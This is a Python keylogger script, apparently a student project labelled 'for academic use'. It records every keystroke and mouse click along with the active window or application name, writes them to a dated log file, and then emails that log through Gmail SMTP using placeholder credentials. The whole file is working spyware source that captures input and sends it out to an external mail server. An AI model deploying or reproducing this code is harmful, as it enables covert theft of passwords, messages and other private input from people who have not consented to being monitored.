# PYTHON LIBRARIES THAT SUPPORT SMTP AND EMAIL OPERATIONS
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
# PYTHON LIBRARY WHICH SUPPORTS INPUT INFORMATION (KEYBOARD AND MOUSE)
from pynput import keyboard, mouse
# PYTHON LIBRARY WHICH SUPPORTS DATE AND TIME OPERATIONS
from datetime import datetime, date
# PYTHON LIBRARIES THAT SUPPORT DATA TYPES AND WINDOWS/APPLICATION FETCHING
import ctypes
import subprocess
import platform

# LOG FILE NAME WITH DATE OF CREATION INCORPORATED
log_file_name = f"log_{date.today()}.txt"

# ESCAPE KEY USED TO STOP LISTENERS
STOP_KEY = keyboard.Key.esc

# GLOBAL FLAG WHICH WILL CORRESPOND TO STOPKEY TO CEASE BOTH LISTENERS
stop_flag = False

# CREATES/INITIALIZES LOG FILE WITH RECORDED CREATION TIME
def initialize_log_file():
    with open(log_file_name, 'a', encoding='utf-8') as f:
        creation_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"File created on {creation_time}\n")

# FINALIZES LOG FILE WITH RECORDED TIME OF SHUT DOWN
def finalize_log_file():
    with open(log_file_name, 'a', encoding='utf-8') as f:
        shutdown_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"Shutdown at {shutdown_time}\n")

# FETCHES CURRENT WINDOW INFORMATION (FOR WINDOWS)
def get_active_window_title():
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        title = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, title, length + 1)
        return title.value if title.value else 'Unknown'
    # ERROR HANDLING
    except Exception as e:
        print(f"AN ERROR OCCURRED WHILE GETTING ACTIVE WINDOW: {e}")
        return 'Unknown'

# FETCHES CURRENT WINDOW INFORMATION (FOR MAC/OS)
def get_active_application():
    try:
        script = 'tell application "System Events" to get the name of the first process whose frontmost is true'
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True)
        return result.stdout.strip() if result.stdout else 'Unknown'
    # ERROR HANDLING
    except Exception as e:
        print(f"AN ERROR OCCURRED WHILE GETTING ACTIVE APPLICATION: {e}")
        return 'Unknown'
# SENDS EMAIL WITH ATTACHMENT (LOG FILE)
def send_email_with_attachment(subject, body, to_email, attachment_file_path):
    from_email = 'SENDER@EMAIL.COM'
    app_password = 'SENDERPASSWORD'
    
    # EMAIL MESSAGE STRUCTURAL COMPONENTS
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject
    # EMAIL FORMATTING
    msg.attach(MIMEText(body, 'plain'))
    
    if attachment_file_path:
        try:
            with open(attachment_file_path, 'rb') as file:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(file.read())
                encoders.encode_base64(part)
                part.add_header(
                    'Content-Disposition',
                    f'attachment; filename={attachment_file_path.split("/")[-1]}',
                )
                msg.attach(part)
        # ERROR HANDLING
        except Exception as e:
            print(f"FAILED TO ATTACH FILE: {e}")
    
    try:
        # USES GMAIL'S SMTP SERVER AND PORT 587 FOR TLS ENCRYPTION
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_email, app_password)
        server.send_message(msg)
        server.quit()
        print('EMAIL SENT SUCCESSFULLY')
    # ERROR HANDLING
    except smtplib.SMTPAuthenticationError:
        print("FAILED TO AUTHENTICATE WITH THE SMTP SERVER. CHECK YOUR EMAIL AND APP PASSWORD.")
    except smtplib.SMTPConnectError:
        print("FAILED TO CONNECT TO THE SMTP SERVER. CHECK THE SERVER ADDRESS AND PORT.")
    except smtplib.SMTPException as e:
        print(f"SMTP ERROR OCCURRED: {e}")
    except Exception as e:
        print(f"AN ERROR OCCURRED: {e}")

# RECORDS KEY STROKES ALONGSIDE APPLICATION/WINDOW
def on_key_press(key):
    global stop_flag
    try:
        # APPLICATION/WINDOW RETRIEVER FUNCTION CALLED
        app_name = get_active_application() if platform.system() == 'Darwin' else get_active_window_title()
        
        # KEY MAPPING FOR KEYBOARD STROKES
        letter = str(key).replace("'", "")
        if letter == 'Key.space':
            letter = ' '
        elif letter == 'Key.enter':
            letter = '\n'
        elif letter == 'Key.backspace':
            letter = '<BACKSPACE>'
        elif letter == 'Key.tab':
            letter = '<TAB>'
        
        # LOG FILE INTEGRATED WINDOW/APPLICATION AND KEYSTROKE RECORDING
        with open(log_file_name, 'a', encoding='utf-8') as f:
            f.write(f"[{app_name}] Key {letter}\n")
        
        # STOP KEY OPERATION
        if key == STOP_KEY:
            stop_flag = True
            return False
    # ERROR HANDLING
    except Exception as e:
        print(f"AN ERROR OCCURRED IN KEYBOARD HANDLER: {e}")

# RECORDS MOUSE OPERATIONS ALONGSIDE APPLICATION/WINDOW
def on_mouse_click(x, y, button, pressed):
    try:
        # APPLICATION/WINDOW RETRIEVER FUNCTION CALLED
        app_name = get_active_application() if platform.system() == 'Darwin' else get_active_window_title()
        
        # BUTTON MAPPING FOR MOUSE OPERATIONS
        button_map = {
            mouse.Button.left: 'LCLICK',
            mouse.Button.right: 'RCLICK',
            mouse.Button.middle: 'MCLICK'
        }
        action = 'pressed' if pressed else 'released'
        button_label = button_map.get(button, str(button))
        
        # LOG FILE INTEGRATED WINDOW/APPLICATION AND MOUSE POSITION RECORDING
        with open(log_file_name, 'a', encoding='utf-8') as f:
            f.write(f"[{app_name}] Mouse {action} at ({x}, {y}) with {button_label}\n")
    # ERROR HANDLING
    except Exception as e:
        print(f"AN ERROR OCCURRED IN MOUSE HANDLER: {e}")

# CREATES KEYBOARD AND MOUSE LISTENERS UNDER PARAMETER DEFINED CONSTRAINTS (on_press/on_click)
initialize_log_file()
keyboard_listener = keyboard.Listener(on_press=on_key_press)
keyboard_listener.start()
mouse_listener = mouse.Listener(on_click=on_mouse_click)
mouse_listener.start()
keyboard_listener.join()

# STOP FLAG CORRESPONDS TO STOPKEY TO SPECIFICALLY STOP MOUSE LISTENER
if stop_flag:
    mouse_listener.stop()
finalize_log_file()

# FUNCTION CALL TO SEND EMAIL TO RECIPIENT WITH LOG FILE ATTACHED
send_email_with_attachment(
    subject='Keylogger Log File - INDPENDENT PROJECT - FOR ACADEMIC USE',
    body='LOG FILE ATTACHED',
    to_email='RECIPIENT@EXAMPLE.com',
    attachment_file_path=log_file_name
)
